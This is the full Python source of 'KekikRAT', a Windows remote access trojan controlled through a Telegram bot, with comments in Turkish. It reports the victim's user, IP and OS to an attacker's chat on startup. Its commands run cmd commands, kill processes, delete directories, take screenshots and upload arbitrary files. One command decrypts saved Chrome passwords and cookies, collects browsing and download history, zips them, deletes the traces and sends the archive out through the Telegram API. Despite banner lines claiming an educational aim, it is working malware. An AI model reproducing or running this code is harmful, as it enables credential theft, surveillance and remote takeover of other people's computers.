#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import os                   # Dizinler ve dosyalarla çalışmak için
import platform             # PC bilgileri için
import webbrowser           # Tarayıcıda bağlantı açtırmak için
import subprocess           # Kill Process(İşlem Sonlandırma) Kullanmak için
import shutil               # Tarayıcı verilerini kopyalamak için
import sqlite3              # Tarayıcıdan çekilen veritabanlarıyla çalışmak için
import win32crypt           # Tarayıcıdan çekilen şifrelenmiş verileri çözmek için
from PIL import ImageGrab   # Ekran görüntüsü almak için
import zipfile              # Topladığımız verileri Zip'lemek için
import requests             # Telegram'a Belge ve Ekran görüntüsü göndermek için
import telebot              # Esas oğlanımız TeleBot

#Hadi Başlayalım..

# / Telegram Bağlantısı ################################################
Bot_Token = "XXXX:XXXX"                                # Bot Token
Chat_ID = "XXXX"                                       # Chat ID

KekikRAT = telebot.TeleBot(Bot_Token)  # telebot'a Tokenimizi bağladık
# / Telegram Bağlantısı ################################################

# / Bağlantı Geldi #################################################
r = requests.get('http://ip.42.pl/raw') # Harici IP'yi bulmak için bir GET isteği yolluyoruz

KullaniciAdi = os.getlogin()    # Kullanıcı Adı Değişkeni tanımlıyoruz
BilgisayarAdi = platform.node() # Bilgisayar Adı Değişkeni
IP = r.text                     # IP Değişkeni tanımlıyoruz
Sistem = platform.system()      # İşletim Sistemi Bilgisi
Bellenim = platform.release()   # Bellenim Sürümü Bilgisi
islemci = platform.processor()  # İşlemci Özellikleri

KekikRAT.send_chat_action(Chat_ID, 'typing')
KekikRAT.send_message(Chat_ID,
                   "⚠️ Bağlantı Geldi ⚠️\n\n" +
                   KullaniciAdi + '@' + BilgisayarAdi +
                   "\n\t" + IP +
                   "\n\nOS : " + Sistem + ' | ' + Bellenim) # Mesaj gönder
# / Bağlantı Geldi #################################################

# / Basla Komutu ########################################################################
@KekikRAT.message_handler(commands=['basla', 'Basla']) # Basla Komutunu bekliyorum
def baslangic(command): # Komut yürütülürse
    KekikRAT.send_chat_action(Chat_ID, 'typing')
    KekikRAT.send_message(Chat_ID,
                          "☣ KekikRAT Çalışıyor ☣" +
                          "\n\nKomutları Öğrenmek için: /komutlar yazabilirsin.." +
                          "\n\nCoded by @keyiflerolsun \nSpecial for @KekikAkademi ♥") # Mesaj gönder
# / Basla Komutu ########################################################################

# / Komutlar Komutu #######################################################################
@KekikRAT.message_handler(commands=['komutlar', 'Komutlar']) # Komutlar Komutunu bekliyorum
def komutlar(command):
    KekikRAT.send_chat_action(Chat_ID, 'typing')
    KekikRAT.send_message(Chat_ID,
                       "KekikRAT içinde Kullanabileceğiniz Komutlar\n\n"+
                       "/basla - Açılış, Bilgi Alma\n"+
                       "/komutlar - Kullanabileceğiniz Komutlar\n"+
                       "/sistem - Bulunduğunuz Sistem Hakkında Bilgi Verir\n"+
                       "/url_ac - domain.com | Chrome'dan Link Açar\n"+
                       "/islem_sonlandir - chrome.exe | İşlem Sonlandırır\n"+
                       "/chrome_verileri - Chrome Tarayıcı Verileri\n"+
                       "/ekran_goruntusu - Anlık Ekran Görüntüsü Verir\n"+
                       "/pwd - Geçerli Dizini Gösterir\n"+
                       "/ls - Bulunulan Dizini Listeler\n"+
                       "/cd - Dizin Değiştirir\n"+
                       "/rm_dir - Dizin Siler\n"+
                       "/indir - Dosya İndirir\n"+
                       "/cmd - CMD'den Komut Çalıştır\n"+
                       "\n\t/hakkinda - Bot Hakkında Bilgi") # Mesaj gönder
# / Komutlar Komutu #######################################################################

# / Sistem Komutu ################################################################################
@KekikRAT.message_handler(commands=['sistem', 'Sistem']) # sistem Komutunu bekliyorum
def sistem(command):
    r = requests.get('http://ip.42.pl/raw') # Harici IP'yi bulmak için bir GET isteği yolluyoruz

    KullaniciAdi = os.getlogin()    # Kullanıcı Adı Değişkeni tanımlıyoruz
    BilgisayarAdi = platform.node() # Bilgisayar Adı Değişkeni
    IP = r.text                     # IP Değişkeni tanımlıyoruz
    Sistem = platform.system()      # İşletim Sistemi Bilgisi
    Bellenim = platform.release()   # Bellenim Sürümü Bilgisi
    islemci = platform.processor()  # İşlemci Özellikleri

    KekikRAT.send_chat_action(Chat_ID, 'typing')
    KekikRAT.send_message(Chat_ID,
                       "Kullanıcı : " + KullaniciAdi + '@' + BilgisayarAdi +
                       "\n\nIP : " + IP +
                       "\n\nOS : " + Sistem + ' | ' + Bellenim +
                       "\n\nİşlemci : " + islemci) # Mesaj gönder
# / Sistem Komutu ################################################################################

# / Url_Ac Komutu ################################################################################
@KekikRAT.message_handler(commands=["url_ac", "Url_Ac"])  # url_ac Komutunu bekliyorum
def url_ac(message):
    GelenMesaj = "{0}".format(message.text) # İletiyi içeren değişken
    URL = GelenMesaj.split(" ")[1]          # URL içeren bir değişken tanımladık

    # https://stackoverflow.com/questions/22445217/python-webbrowser-open-to-open-chrome-browser
    Chrome_Dizini = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'

    webbrowser.get(Chrome_Dizini).open(URL)         # Bağlantıyı aç / veya / open_new_tab(URL)
    KekikRAT.send_chat_action(Chat_ID, 'typing')
    KekikRAT.send_message(Chat_ID, "Hallettim!")    # Mesaj gönder
# / Url_Ac Komutu ################################################################################

# / Islem_Sonlandir Komutu ######################################################################################
@KekikRAT.message_handler(commands=["islem_sonlandir", "Islem_Sonlandir"]) # islem_sonlandir Komutunu bekliyorum
def islem_sonlandir(message):
    try: # Çalıştırmayı Dene (Hata ile karşılaşıldığında betik kapanmasın diye..)
        GelenMesaj = "{0}".format(message.text)                         # Gelen Mesajı içeren değişken
        subprocess.call("taskkill /IM " + GelenMesaj.split(" ")[1])     # Süreci adıyla öldür
        KekikRAT.send_chat_action(Chat_ID, 'typing')
        KekikRAT.send_message(Chat_ID, "Hallettim!")                    # Mesaj gönder
    except: # Hata varsa
        KekikRAT.send_chat_action(Chat_ID, 'typing')
        KekikRAT.send_message(Chat_ID, "Kapatılamadı!")
# / Islem_Sonlandir Komutu ######################################################################################

# / Chrome_Verileri Komutu ######################################################################################
@KekikRAT.message_handler(commands=["chrome_verileri", "Chrome_Verileri"]) # chrome_verileri Komutunu bekliyorum
def chrome_verileri(message):
    KekikRAT.send_chat_action(Chat_ID, 'typing')
    KekikRAT.send_message(Chat_ID, "Bekleyin...")  # "Bekleyin..." mesajını gönderiyoruz
    KekikRAT.send_chat_action(Chat_ID, 'typing')
    ###
    KullaniciAdi = os.getlogin()
    ChromeYolu = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\'
    AppData = os.getenv("APPDATA") + '\\'
    def ChromePass():
        if os.path.exists(ChromeYolu + 'Login Data'):
            # DB'yi Kopyala
            shutil.copy2(ChromeYolu + 'Login Data', AppData + '{}_LoginData.sql'.format(KullaniciAdi))
            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(AppData + '{}_LoginData.sql'.format(KullaniciAdi))
            cursor = conn.cursor()
            # Dosya Oluştur Başlık Gir
            Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı Şifreleri\n\n'
            file = open(AppData + '{}_ChromePass.txt'.format(KullaniciAdi), "w+")  #
            file.write(Banner)
            file.close()
            # Sonuçları getir
            GelenVeri = []
            cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                # Login ve URL Kolonları
                login = result[1]
                url = result[0]
                try:
                    password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                    if login and url and password:
                        data = '=' * 100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n' + '=' * 100
                        GelenVeri.append(data)
                except:
                    pass
            for Sonuc in GelenVeri:
                file = open(AppData + '{}_ChromePass.txt'.format(KullaniciAdi), "a+")  #
                file.write(Sonuc + '\n')
                file.close()
    def ChromeCookies():
        if os.path.exists(ChromeYolu + 'Cookies'):
            # DB'yi Kopyala
            shutil.copy2(ChromeYolu + 'Cookies', AppData + '{}_Cookies.sql'.format(KullaniciAdi))
            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(AppData + '{}_Cookies.sql'.format(KullaniciAdi))
            cursor = conn.cursor()
            # Dosya Oluştur Başlık Gir
            Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı Çerezleri\n\n'
            file = open(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi), "w+")  #
            file.write(Banner)
            file.close()
            # Sonuçları getir
            GelenVeri = []
            cursor.execute('SELECT * from cookies')
            for result in cursor.fetchall():
                # url ve name Kolonları
                url = result[1]
                name = result[2]
                try:
                    cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
                    if url and name and cookie:
                        data = '=' * 100 + '\nURL: ' + url + '\nCOOKIE: ' + cookie + '\nCOOKIE NAME: ' + name + '\n' + '=' * 100
                        GelenVeri.append(data)
                except:
                    pass
            for Sonuc in GelenVeri:
                file = open(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi), "a+")  #
                file.write(Sonuc + '\n')
                file.close()
    def ChromeDownloadHistory():
        if os.path.exists(ChromeYolu + 'History'):
            # DB'yi Kopyala
            shutil.copy2(ChromeYolu + 'History', AppData + '{}_History.sql'.format(KullaniciAdi))
            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(AppData + '{}_History.sql'.format(KullaniciAdi))
            cursor = conn.cursor()
            # Dosya Oluştur Başlık Gir
            Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı İndirme Geçmişi\n\n'
            file = open(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi), "w+")  #
            file.write(Banner)
            file.close()
            # Sonuçları getir
            GelenVeri = []
            cursor.execute('SELECT current_path, tab_url from downloads')
            for result in cursor.fetchall():
                # Dizin ve URL Kolonları
                Dizin = result[0]
                URL = result[1]
                try:
                    if Dizin and URL:
                        data = '=' * 100 + '\nDizin: ' + Dizin + '\nURL: ' + URL + '\n' + '=' * 100
                        GelenVeri.append(data)
                except:
                    pass
            for Sonuc in GelenVeri:
                file = open(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi), "a+")  #
                file.write(Sonuc + '\n')
                file.close()
    def ChromeURLHistory():
        if os.path.exists(ChromeYolu + 'History'):
            # DB'yi Kopyala
            shutil.copy2(ChromeYolu + 'History', AppData + '{}_History.sql'.format(KullaniciAdi))
            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(AppData + '{}_History.sql'.format(KullaniciAdi))
            cursor = conn.cursor()
            # Dosya Oluştur Başlık Gir
            Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı URL Geçmişi\n\n'
            file = open(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi), "w+")  #
            file.write(Banner)
            file.close()
            # Sonuçları getir
            GelenVeri = []
            cursor.execute('SELECT title, url from urls')
            for result in cursor.fetchall():
                # Baslik ve URL Kolonları
                Baslik = result[0]
                URL = result[1]
                try:
                    if Baslik and URL:
                        data = '=' * 100 + '\nBaşlık: ' + Baslik + '\nURL: ' + URL + '\n' + '=' * 100
                        GelenVeri.append(data)
                except:
                    pass
            for Sonuc in GelenVeri:
                try:
                    file = open(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi), "a+")  #
                    file.write(Sonuc + '\n')
                    file.close()
                except:
                    pass
    def ScreenShot():
        screen = ImageGrab.grab()
        screen.save(AppData + '{}_ScreenShot.jpg'.format(KullaniciAdi))
    ChromePass()
    ChromeCookies()
    ChromeDownloadHistory()
    ChromeURLHistory()
    ScreenShot()
    def ZipFile():
        ZipName = AppData + '{}_LOG.zip'.format(KullaniciAdi)
        YeniZip = zipfile.ZipFile(ZipName, 'w')
        YeniZip.write(AppData + '{}_ChromePass.txt'.format(KullaniciAdi))
        YeniZip.write(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi))
        YeniZip.write(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi))
        YeniZip.write(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi))
        YeniZip.write(AppData + '{}_ScreenShot.jpg'.format(KullaniciAdi))
        YeniZip.close()
    ZipFile()
    def imha():
        os.remove(AppData + '{}_ChromePass.txt'.format(KullaniciAdi))
        os.remove(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi))
        os.remove(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi))
        os.remove(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi))
        os.remove(AppData + '{}_ScreenShot.jpg'.format(KullaniciAdi))
        os.remove(AppData + '{}_LoginData.sql'.format(KullaniciAdi))
        os.remove(AppData + '{}_Cookies.sql'.format(KullaniciAdi))
        os.remove(AppData + '{}_History.sql'.format(KullaniciAdi))
    imha()
    def TelegramSend():
        KekikRAT.send_chat_action(Chat_ID, 'upload_document')
        Loglar = {'document': open(AppData + '{}_LOG.zip'.format(KullaniciAdi), 'rb')}
        requests.post("https://api.telegram.org/bot" + Bot_Token + "/sendDocument?chat_id=" + Chat_ID, files=Loglar)
    TelegramSend()
    os.remove(AppData + '{}_LOG.zip'.format(KullaniciAdi))
    ###
    KekikRAT.send_chat_action(Chat_ID, 'typing')
    KekikRAT.send_message(Chat_ID, "Hallettim!")
# / Chrome_Verileri Komutu ######################################################################################

# / Ekran_Goruntusu Komutu ##################################################################################################################
@KekikRAT.message_handler(commands=['ekran_goruntusu', 'Ekran_Goruntusu']) # ekran_goruntusu Komutunu bekliyorum
def ekran_goruntusu(command) :
    KekikRAT.send_chat_action(Chat_ID, 'typing')
    KekikRAT.send_message(Chat_ID, "Bekleyin...")                   # "Bekleyin..." mesajını gönderiyoruz
    Ekran = ImageGrab.grab()                                        # Ekran görüntüsü almaya eşit bir değişken oluşturduk
    Ekran.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')            # Ekran görüntüsünü AppData klasörüne kaydettik
    Ekran = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')    # Değişkenimizi güncelliyoruz
    EkranResmi = {'photo': Ekran}                                   # POST isteği göndermek için değişken oluşturduk
    KekikRAT.send_chat_action(Chat_ID, 'upload_photo')
    requests.post("https://api.telegram.org/bot" + Bot_Token + "/sendPhoto?chat_id=" + Chat_ID , files=EkranResmi) # Bir istekte bulunuyoruz
# / Ekran_Goruntusu Komutu ##################################################################################################################

# / PWD Komutu ##################################################################################
@KekikRAT.message_handler(commands=['pwd' , 'PWD']) # pwd Komutunu Bekliyorum
def pwd(command) :
    Bulunulan_Dizin = os.path.abspath(os.getcwd()) # Geçerli Dizini tanımladık
    KekikRAT.send_chat_action(Chat_ID, 'typing')
    KekikRAT.send_message(Chat_ID, "Geçerli dizin: \n" + (str(Bulunulan_Dizin)))  # Mesaj gönder
# / PWD Komutu ##################################################################################

# / LS Komutu ###################################################################################################
@KekikRAT.message_handler(commands=["ls", "LS"]) # ls Komutunu bekliyorum
def ls_dir(commands):
     Listele = '\n'.join(os.listdir(path=".")) # Tüm klasörleri ve dosyaları içeren Listele değişkeni tanımladık
     KekikRAT.send_chat_action(Chat_ID, 'typing')
     KekikRAT.send_message(Chat_ID, "{} :".format(os.getcwd()) + "\n\n" + Listele)
# / LS Komutu ###################################################################################################

# / CD Komutu #############################################################################
@KekikRAT.message_handler(commands=["cd", "CD"]) # cd Komutunu bekliyorum
def cd_dir(message):
    try: # Çalıştırmayı Dene
        GelenMesaj = "{0}".format(message.text)
        GidilecekDizin = GelenMesaj.split(" ")[1] # Değişken - dizin
        os.chdir(GidilecekDizin) # Dizini değiştir
        KekikRAT.send_chat_action(Chat_ID, 'typing')
        KekikRAT.send_message(Chat_ID, "Şu şekilde değişti:\n\n{}".format(os.getcwd()))
    except: # Hata varsa
        KekikRAT.send_chat_action(Chat_ID, 'typing')
        KekikRAT.send_message(Chat_ID, "Dizine Gidilemedi!")
# / CD Komutu #############################################################################

# / RM_Dir Komutu ######################################################################
@KekikRAT.message_handler(commands = ["rm_dir", "RM_Dir"]) # rm_dir Komutunu bekliyorum
def delete_dir(message) :
    try: # Çalıştırmayı Dene
        GelenMesaj = "{0}".format(message.text)
        SilinecekDizin = GelenMesaj.split(" ")[1] # Değişken - Klasör adı
        os.removedirs(SilinecekDizin) # Klasörü sil
        KekikRAT.send_chat_action(Chat_ID, 'typing')
        KekikRAT.send_message(Chat_ID, "Bu Klasör: " + SilinecekDizin + " silindi..")
    except: # Hata varsa
        KekikRAT.send_chat_action(Chat_ID, 'typing')
        KekikRAT.send_message(Chat_ID, "Dizin Silinemedi!")
# / RM_Dir Komutu ######################################################################

# / Indir Komutu ########################################################################
@KekikRAT.message_handler(commands=["indir", "Indir"])  # indir Komutunu bekliyorum
def dosya_indir(message):
    try: # Çalıştırmayı Dene
        KekikRAT.send_chat_action(Chat_ID, 'typing')
        KekikRAT.send_message(Chat_ID, "Bekleyin...")  
    
        GelenMesaj = "{0}".format(message.text)
        Dosya = GelenMesaj.split(" ")[1]  # Dosya adını içeren değişken

        Gonderi = {'document': open(Dosya, 'rb')}  # POST isteği için değişken
        
        KekikRAT.send_chat_action(Chat_ID, 'upload_document')
        requests.post("https://api.telegram.org/bot" + Bot_Token +
                      "/sendDocument?chat_id=" + Chat_ID , files=Gonderi)  # Dosya gönder
    except: # Hata varsa
        KekikRAT.send_chat_action(Chat_ID, 'typing')
        KekikRAT.send_message(Chat_ID, "Dosya İndirilemedi! (Dizin İndirilmez!)")
# / Indir Komutu ########################################################################

# / CMD Komutu ###########################################################################################
@KekikRAT.message_handler(commands=["cmd", "CMD"]) # cmd Komutunu bekliyorum
def cmd_komutu(message) :
    try: # Çalıştırmayı Dene
        GelenMesaj = "{0}".format(message.text)
        subprocess.Popen([r'C:\\Windows\\system32\\cmd.exe', GelenMesaj.split(" ")[1]])  # Cmd'de çalıştır
        KekikRAT.send_chat_action(Chat_ID, 'typing')
        KekikRAT.send_message(Chat_ID, "Bitti!")
    except: # Hata varsa
        KekikRAT.send_chat_action(Chat_ID, 'typing')
        KekikRAT.send_message(Chat_ID, "CMD Komutu Çalıştırılamadı!")
# / CMD Komutu ###########################################################################################

# / HAKKINDA Komutu ################################################################################################
@KekikRAT.message_handler(commands = ["hakkinda", "HAKKINDA"]) # hakkinda Komutunu bekliyorum
def hakkinda(commands):
    KekikRAT.send_chat_action(Chat_ID, 'typing')
    KekikRAT.send_message(Chat_ID, "☣ KekikRAT v 1.0 ☣ \n\nCoded by @keyiflerolsun \nSpecial for @KekikAkademi ♥")
# / HAKKINDA Komutu ################################################################################################

KekikRAT.polling() # Çalış Aslan Parçası :)